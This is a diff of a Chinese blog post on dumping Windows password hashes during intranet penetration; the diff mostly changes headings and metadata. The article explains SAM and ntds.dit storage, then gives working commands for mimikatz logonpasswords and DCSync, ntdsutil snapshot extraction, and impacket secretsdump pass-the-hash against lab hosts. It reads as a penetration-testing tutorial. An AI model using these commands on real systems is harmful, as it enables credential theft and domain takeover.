@@ -11,7 +11,7 @@
   <meta itemprop="name" content="windows hash抓取">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="390">
+  <meta itemprop="wordCount" content="380">
   <meta itemprop="keywords" content="攻防,内网渗透"><meta property="og:url" content="https://dongyu29.github.io/posts/%E6%94%BB%E9%98%B2/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows/56/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="windows hash抓取">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/56\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  390 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "攻防, 内网渗透","wordcount":  380 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E6%94%BB%E9%98%B2\/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F\/windows\/56\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Windows Hash抓取</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="390 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%94%BB%E9%98%B2/" class="post-category" title="Category - 攻防"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 攻防</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="380 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,11 +152,14 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
-      <ul>
-        <li></li>
-      </ul>
-    </li>
+    <li><a href="#直接跑">直接跑</a></li>
+    <li><a href="#导出目标-lsass-进程内存">导出目标 Lsass 进程内存</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#mimikatz-直接获取域密码">mimikatz 直接获取域密码</a></li>
+    <li><a href="#导出域内密码数据库然后本地使用-mimikatz-获取">导出域内密码数据库，然后本地使用 mimikatz 获取</a></li>
+    <li><a href="#impacket">impacket</a></li>
   </ul>
 </nav></div>
       </div><div class="content" id="content" data-end-flag="-----（完）-----"><blockquote>
@@ -166,58 +169,58 @@
 </blockquote>
 <p>感觉网上搜到的文章大多都很垃圾，上来就一顿讲一堆工具怎么抓hash，实际上抓hash还是一个权限的问题，有了权限以后就可以抓，没权限换100个工具也不行</p>
 </blockquote>
-<h5 id="hash" class="heading-element"><span>0.0.0.1  hash</span>
+<h1 id="hash" class="heading-element"><span>hash</span>
   <a href="#hash" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>Windows 系统中的密码一般由两部分组成，分别是 LM Hash 和 NTLM Hash，结构通常如下：</p>
+</h1><p>Windows 系统中的密码一般由两部分组成，分别是 LM Hash 和 NTLM Hash，结构通常如下：</p>
 <pre tabindex="0"><code class="language-none" data-lang="none">username:RID:LM-Hash:NT-Hash</code></pre><p>LM Hash（LAN Manager Hash）是 Windows 最早使用的加密算法，它不太安全，现在已经被NTLM hash取代了。</p>
 <p>在 Windows Vista 和 Windows Server 2003 及之前的系统默认使用的是 LM 加密，只有用户密码超过 14 位时才会使用 NTLM 加密，之后从 Vista 的系统开始，不再使用 LM Hash 加密，而是全部采用了 NTLM Hash 加密。</p>
 <p>如果用户密码为空密码或者不存储 LM Hash 的话，我们抓到的 LM Hash 就是 AAD3B435B51404EEAAD3B435B51404EE，所以在 Vista 和 Windows Server 2003 之后的系统里抓取到的 LM Hash 都是 AAD3B435B51404EEAAD3B435B51404EE，其实这里的 LM Hash 也没有任何意义了。</p>
 <p>也就是说从Windows Vista 和 Windows Server 2008 开始，默认情况下只存储 NTLM Hash，LM Hash 将不再被使用。</p>
-<h5 id="hash存储的过程" class="heading-element"><span>0.0.0.2  hash存储的过程</span>
+<h1 id="hash存储的过程" class="heading-element"><span>hash存储的过程</span>
   <a href="#hash%e5%ad%98%e5%82%a8%e7%9a%84%e8%bf%87%e7%a8%8b" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>本地：用户输入-&gt;lsass进程存储明文到内存里-&gt;转为hash 并和本地存储SAM数据库里面的hash进行比较-&gt;hash相同 允许登录</p>
+</h1><p>本地：用户输入-&gt;lsass进程存储明文到内存里-&gt;转为hash 并和本地存储SAM数据库里面的hash进行比较-&gt;hash相同 允许登录</p>
 <p>域：</p>
 <p>Windows 系统一般使用两种方法对用户的密码进行加密处理，在域环境中，用户的密码信息以哈希值的密文形式存储在 ntds.dit 二进制文件中，该文件位于 %SystemRoot%\ntds\ntds.dit 路径下，由于该文件一直被活动目录访问，因此这个文件是被系统禁止读取的。</p>
 <p>在非域环境中，即工作组的环境中，用户的密码等信息被存储在 SAM 文件中，该文件也同样是被系统禁止读取的。</p>
-<h5 id="文件" class="heading-element"><span>0.0.0.3  文件</span>
+<h1 id="文件" class="heading-element"><span>文件</span>
   <a href="#%e6%96%87%e4%bb%b6" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>有几个比较关键的文件：</p>
+</h1><p>有几个比较关键的文件：</p>
 <ul>
 <li>SAM：SAM记录的数据包括所有组、账户信息、密码HASH、账户SID等，它不但有文件数据，在注册表里面还有一个数据库，位于HKEY_LOCAL_MACHINE\SAM下</li>
 <li>SYSTEM：对应的注册表分支为HKEY_LOCAL_MACHINE\SYSTEM，对应的存储文件是\Windows\System32\config\SYSTEM，其作用是存储计算机硬件和系统的信息。</li>
 <li>security：对应的分支HKEY_LOCAL_MACHINE\SECURITY，存储在C:\Windows\System32\config\SECURITY文件中，保存了安全性设置信息。</li>
 <li>ntds.dit：在域中的所有账号密码被存放在了 ntds.dit 文件中，如果获取到该文件就相当于拿到整个域权限，不过该文件只在域控中。</li>
 </ul>
-<h5 id="本地hash抓取" class="heading-element"><span>0.0.0.4  本地hash抓取</span>
+<h1 id="本地hash抓取" class="heading-element"><span>本地hash抓取</span>
   <a href="#%e6%9c%ac%e5%9c%b0hash%e6%8a%93%e5%8f%96" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>密码抓取与获取主要使用 mimikatz，但目标机器存在杀软时，如果没有免杀手段 mimikatz 必然是落地死的。</p>
+</h1><p>密码抓取与获取主要使用 mimikatz，但目标机器存在杀软时，如果没有免杀手段 mimikatz 必然是落地死的。</p>
 <p>所以我们需要将 Lsass 进程内存下载下来到本地用 mimikatz 读取。</p>
 <p>下面主要介绍两种方式获取本地密码</p>
 <p>①在目标机器直接跑 mimikatz</p>
 <p>②将目标机器 lsass 内存下载下来，在本地用 mimikatz 读</p>
-<h6 id="直接跑" class="heading-element"><span>0.0.0.4.1  直接跑</span>
+<h2 id="直接跑" class="heading-element"><span>直接跑</span>
   <a href="#%e7%9b%b4%e6%8e%a5%e8%b7%91" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>Mimikatz 存在两个可选组件：</p>
+</h2><p>Mimikatz 存在两个可选组件：</p>
 <p>mimidrv：与 Windows 内核交互的驱动程序</p>
 <p>mimilib：绕过 AppLocker，验证包 / SSP，密码过滤器以及用于 WinDBG 的 sekurlsa</p>
 <p>Mimikatz 需要管理员或者 SYSTEM 权限，使用 DEBUG 权限执行某些操作，与 LSASS 进程进行交互。</p>
 <p><strong>读取密码</strong></p>
 <pre tabindex="0"><code>privilege::debug   #获取system权限
-sekurlsa::logonpasswords  #获取本地密码</code></pre><h6 id="导出目标-lsass-进程内存" class="heading-element"><span>0.0.0.4.2  导出目标 Lsass 进程内存</span>
+sekurlsa::logonpasswords  #获取本地密码</code></pre><h2 id="导出目标-lsass-进程内存" class="heading-element"><span>导出目标 Lsass 进程内存</span>
   <a href="#%e5%af%bc%e5%87%ba%e7%9b%ae%e6%a0%87-lsass-%e8%bf%9b%e7%a8%8b%e5%86%85%e5%ad%98" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><ul>
+</h2><ul>
 <li>注册表导出</li>
 </ul>
 <p>由管理员权限的话甚至可以这样，直接注册表导出把这几个文件提出来，然后本地secertdump提取hash</p>
@@ -243,52 +246,52 @@ sekurlsa::logonpasswords</code></pre><ul>
 <p>然后在本地将 hash 给弄出来</p>
 <pre tabindex="0"><code>lsadump::sam /sam:sam /system:system
 or
-secretsdump.py LOCAL -system system -sam sam -security security</code></pre><h5 id="域内hash抓取" class="heading-element"><span>0.0.0.5  域内hash抓取</span>
+secretsdump.py LOCAL -system system -sam sam -security security</code></pre><h1 id="域内hash抓取" class="heading-element"><span>域内hash抓取</span>
   <a href="#%e5%9f%9f%e5%86%85hash%e6%8a%93%e5%8f%96" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>域中的账户密码采用的是集中管理而非本地模式，即密码保存在的是 DC，而不在本地，==但当认证成功后，本地内存中是存在密码的==。</p>
+</h1><p>域中的账户密码采用的是集中管理而非本地模式，即密码保存在的是 DC，而不在本地，==但当认证成功后，本地内存中是存在密码的==。</p>
 <p>C:\Windows\NTDS\ntds.dit 或 % SystemRoot%\NTDS 是域控中一个专属的活动目录数据库，包括有关域用户、组和组成员身份的信息。它还包括域中所有用户的密码哈希值。但由于系统高级用户的占用，这种重要文件用户正常情况下是无法对其进行任何操作的。</p>
 <p>有域管权限的情况下：</p>
 <p>比如说委派抓到了域管的TGT</p>
-<h6 id="mimikatz-直接获取域密码" class="heading-element"><span>0.0.0.5.1  mimikatz 直接获取域密码</span>
+<h2 id="mimikatz-直接获取域密码" class="heading-element"><span>mimikatz 直接获取域密码</span>
   <a href="#mimikatz-%e7%9b%b4%e6%8e%a5%e8%8e%b7%e5%8f%96%e5%9f%9f%e5%af%86%e7%a0%81" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><pre tabindex="0"><code>privilege::debug   #获取system权限
+</h2><pre tabindex="0"><code>privilege::debug   #获取system权限
 lsadump::dcsync /domain:test.com /all /csv  #获取密码</code></pre><p>other 命令</p>
 <pre tabindex="0"><code>sekurlsa::logonpasswords # 此命令可以看到当前客户端所有用户以及域名
 lsadump::dcsync /domain:域名 /all /csv 
-##### 利用目录复制服务（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。（和下面的导出同原理）
-##### 查看所有用户凭证信息
-lsadump::lsa /inject</code></pre><h6 id="导出域内密码数据库然后本地使用-mimikatz-获取" class="heading-element"><span>0.0.0.5.2  导出域内密码数据库，然后本地使用 mimikatz 获取</span>
+# 利用目录复制服务（Directory Replication Service, DRS）从NTDS.DIT文件中提取密码哈希值。（和下面的导出同原理）
+# 查看所有用户凭证信息
+lsadump::lsa /inject</code></pre><h2 id="导出域内密码数据库然后本地使用-mimikatz-获取" class="heading-element"><span>导出域内密码数据库，然后本地使用 mimikatz 获取</span>
   <a href="#%e5%af%bc%e5%87%ba%e5%9f%9f%e5%86%85%e5%af%86%e7%a0%81%e6%95%b0%e6%8d%ae%e5%ba%93%e7%84%b6%e5%90%8e%e6%9c%ac%e5%9c%b0%e4%bd%bf%e7%94%a8-mimikatz-%e8%8e%b7%e5%8f%96" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>域内 hash 保存在 c:\windows\ntds\ntds.dit 中，是一个 esent 数据库，导出域内 HASH 时 需要域管权限： 获取域管权限后，因为文件实时占用，所以无法直接导出，需要使用 ShadowCopy 的方法将 ntds.dit 提取出来</p>
-<pre tabindex="0"><code>#####首先创建快照
+</h2><p>域内 hash 保存在 c:\windows\ntds\ntds.dit 中，是一个 esent 数据库，导出域内 HASH 时 需要域管权限： 获取域管权限后，因为文件实时占用，所以无法直接导出，需要使用 ShadowCopy 的方法将 ntds.dit 提取出来</p>
+<pre tabindex="0"><code>#首先创建快照
 Ntdsutil snapshot &#34;activate instance ntds&#34; create quit quit
-#####创建快照后会生成一个快照 ID，挂载该 ID 的快照
+#创建快照后会生成一个快照 ID，挂载该 ID 的快照
 Ntdsutil snapshot &#34;mount {39842c86-23d2-4084-9049-ce07926721dd}&#34; quit quit
-#####快照成功挂载后会映射到一个指定目录下，接下来从该目录下拷贝对应的密码文件
+#快照成功挂载后会映射到一个指定目录下，接下来从该目录下拷贝对应的密码文件
 Copy &#39;C:\$SNAP_202107241427_VOLUMEC$\windows\NTDS\ntds.dit&#39; c:\ntds.dit
-#####清理快照痕迹，卸载快照
+#清理快照痕迹，卸载快照
 Ntdsutil snapshot &#34;unmount {39842c86-23d2-4084-9049-ce07926721dd}&#34; quit quit
-#####删除快照
+#删除快照
 Ntdsutil snapshot &#34;delete {39842c86-23d2-4084-9049-ce07926721dd}&#34; quit quit
-#####上述步骤成功获取了存有域内所有 Hash 的数据库，接下来是从域控上导出解密Key
+#上述步骤成功获取了存有域内所有 Hash 的数据库，接下来是从域控上导出解密Key
 Reg save HKLM\SYSTEM c:\sys.hiv
-#####使用 NTDSDumpEx 导出的 Key 解密数据库获取hash
+#使用 NTDSDumpEx 导出的 Key 解密数据库获取hash
 NTDSDumpEx.exe -d ntds.dit -o hash.txt -s sys.hiv -h</code></pre><p>之后可以使用ntdsdump进行离线提取Hash:</p>
 <pre tabindex="0"><code>ntdsdump.exe -f ntds.dit -s SYSTEM</code></pre><p>参数说明</p>
 <pre tabindex="0"><code>ntdsdump.exe &lt;-f ntds.dit&gt; &lt;-k HEX-SYS-KEY | -s system.hiv&gt; [-o out.txt] [-h] [-t JOHN|LC] * -f ntds.dit路径 * -k 可选的十六进制格式的SYSKEY * -s 可选的system.hiv路径 * -h 导出历史密码记录 * -t 导出格式，LC或JOHN * -o 导出到指定文件中 *</code></pre><p>PS：前面步骤不报错就不需要这一步。</p>
 <p>我们拿到的用户凭证文件 ntds.dit 在获取的时候文件是被占用状态，所以获取的文件可能会有一些问题，这时候我们就需要先进行一步修复操作。</p>
-<pre tabindex="0"><code>##### esentutl 是一个微软自带的工具,是专门用来对微软系统数据库进行一些常用操作的工具包,其中/p就代表使用修复功能
-esentutl /p /o ntds.dit</code></pre><h6 id="impacket" class="heading-element"><span>0.0.0.5.3  impacket</span>
+<pre tabindex="0"><code># esentutl 是一个微软自带的工具,是专门用来对微软系统数据库进行一些常用操作的工具包,其中/p就代表使用修复功能
+esentutl /p /o ntds.dit</code></pre><h2 id="impacket" class="heading-element"><span>impacket</span>
   <a href="#impacket" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>这里以及导入了票据了，抓取某个机器的hash</p>
+</h2><p>这里以及导入了票据了，抓取某个机器的hash</p>
 <pre tabindex="0"><code>proxychains python3 secretsdump.py -k -no-pass Fileserver.xiaorang.lab -dc-ip 172.22.60.8</code></pre><p>DcSync</p>
 <pre tabindex="0"><code>proxychains secretsdump.py xiaorang.lab/&#39;Fileserver$&#39;:@172.22.60.8 -hashes &#39;:951d8a9265dfb652f42e5c8c497d70dc&#39; -just-dc-user Administrator</code></pre></div><div class="post-footer" id="post-footer">
   <div class="post-info">
